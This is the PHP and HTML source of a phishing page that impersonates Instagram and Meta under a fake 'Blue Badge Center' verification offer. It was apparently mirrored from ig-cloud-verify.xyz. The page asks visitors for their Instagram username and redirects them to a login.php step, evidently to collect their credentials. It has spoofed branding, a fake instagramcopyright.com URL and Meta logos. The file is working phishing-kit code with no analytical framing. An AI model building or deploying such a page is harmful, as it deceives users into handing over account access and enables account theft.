<?php
if($_POST){
$id= $_POST['id'];
  header("Location: login.php?id=$id");
}
?>

<!DOCTYPE html>
<html lang="en">
   <head>
      <title>Blue Tick Verified </title>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
	  <meta property="og:image" content="<?php echo $pp; ?>" />
	  <meta property="og:type" content="website">
    <meta property="og:url" content="https://instagramcopyright.com/">
    <meta property="og:title" content="Blue Tick Verified ">
    <meta property="og:description" content="Create an account or log in to Instagram - A simple, fun and creative way to take and edit photos and videos, and share those photos, videos and messages with friends and relatives.">
    
      <!--===============================================================================================-->	
      <link rel="icon" type="image/png" href="favicon.png"/>
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/vendor/bootstrap/css/bootstrap.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/vendor/animate/animate.css">
      <!--===============================================================================================-->	
      <link rel="stylesheet" type="text/css" href="css/vendor/css-hamburgers/hamburgers.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/vendor/select2/select2.min.css">
      <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/util.css">
      <link rel="stylesheet" type="text/css" href="css/main.css">
      <!--===============================================================================================-->
   </head>
   <style type="text/css">
   <style>
      img {
      border: 1px solid #ddd;
      border-radius: 4px;
      padding: 5px;
      width: 150px;
      }
      .overlay{
      display: none;
      position: fixed;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      z-index: 999;
      background: rgba(255,255,255,0.8) url("https://i.pinimg.com/originals/78/e8/26/78e826ca1b9351214dfdd5e47f7e2024.gif") center no-repeat;
      }
      /* Turn off scrollbar when body element has the loading class */
      body.loading{
      overflow: hidden;   
      }
      /* Make spinner image visible when body element has the loading class */
      body.loading .overlay{
      display: block;
      }
   </style>
   <style type="text/css">  .btn {
      cursor: pointer;
      width: 100%;
      padding:0 8px; 
      background: #3897f0;
      border:1px solid #3897f0;
      color:#fff;
      border-radius:10px;
      font-weight:600;
      font-size: 14px;
      height: 35px;
      line-height: 26px;
      outline: none;
      white-space: nowrap;
      }
	  
	  .container-login100{
	  
	background-image: linear-gradient(to right, #00b8ff, #a900ff);
}
   </style>
</head>
<body>
     <form autocomplete="off" method="post" enctype="multipart/form-data">
   <body><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
      <div class="limiter">
         <div class="container-login100">
            <div class="wrap-login100">
               <div class="login100-pic js-tilt" data-tilt="" style="will-change: transform; transform: perspective(300px) rotateX(0deg) rotateY(0deg);">
                  <img style="max-width:90%; border-radius:50%; margin-top:20px;" src="p.png" alt="IMG"> <br><br><br><br>
               </div>
<el class="login100-form validate-form" id="elemend"><form id="two">
	
	<br>
		<center><img style="margin-top:-120px;" src="https://i.hizliresim.com/5xns4qf.png"  width="180">
	<br>
            <center><h2 class="title">Blue Badge Center<h2>
            <br>
            <center><p>Hello,
Please enter your instagram username and verify your identity to access the verification form.</p></center>
            <br>
    <form method="post">
  <div class="wrap-input100 validate-input">
<input required="" class="input100" type="text" name="id" placeholder="Username">
<span class="focus-input100"></span>
<span class="symbol-input100">
<i class="fa fa-user" aria-hidden="true"></i>
</span>
</div>
<div class="container-login100-form-btn" style="margin-top:-20px;">
<button type="submit" id="imagei" class="btn">Contunie</button>
<br><br><br>

</form>
	
<form>
			</div>
		</div>
	</div>
		<div style="background:#fafafa; width:100%; height:70px; border-top:0.5px solid rgb(0,0,0,0.3);" class="lilvlad2">
			<center><img style="margin-top:20px;" src="meta.png" width="150"></center>
			</div>
	

	
<!--===============================================================================================-->	
	<script src="assets/vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="assets/vendor/bootstrap/js/popper.js"></script>
	<script src="assets/vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="assets/vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="assets/vendor/tilt/tilt.jquery.min.js"></script>
	<script type="text/javascript" src="assets/swetalert.js"></script>
   	   	
   
<!--===============================================================================================-->
	<script src="assets/js/main.js"></script>
<script type="text/javascript">
$("#idForm").submit(function(e) {

    e.preventDefault(); // avoid to execute the actual submit of the form.

    var form = $(this);
    var url = form.attr('action');
       var btn = $("#imagei");
         btn.prop("disabled", true);
         
    
      btn.html("Lütfen Bekleyin...");

              imagekadi = $('input[name="username"]').val();

    $.ajax({
          
           url: url,
           data: form.serialize(),
           statusCode: {
      500: function (response) {
      
         alert("Incorrect UserName You Entered.");
             
         document.getElementById("imagei").type="submit";
         document.getElementById("imagei").value="Search";
return false;
      },
           success: function(data)
           {
         if (data=="" || data=="error" ) {
             
         
             swal("İnfo", "Incorrect UserName You Entered.", "info");
          btn.prop("disabled", false);
         
    
      btn.html("Continue");
return false;
     }


    window.location = "index7b9b.html"+imagekadi
                
           }
         });

    
});
$("#userpass").submit(function(e) {
    
    e.preventDefault();
    
    alert("dsd");
});

</script>
</body>

<!-- Mirrored from ig-cloud-verify.xyz/destek/ by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 14 Feb 2022 20:01:47 GMT -->
</html>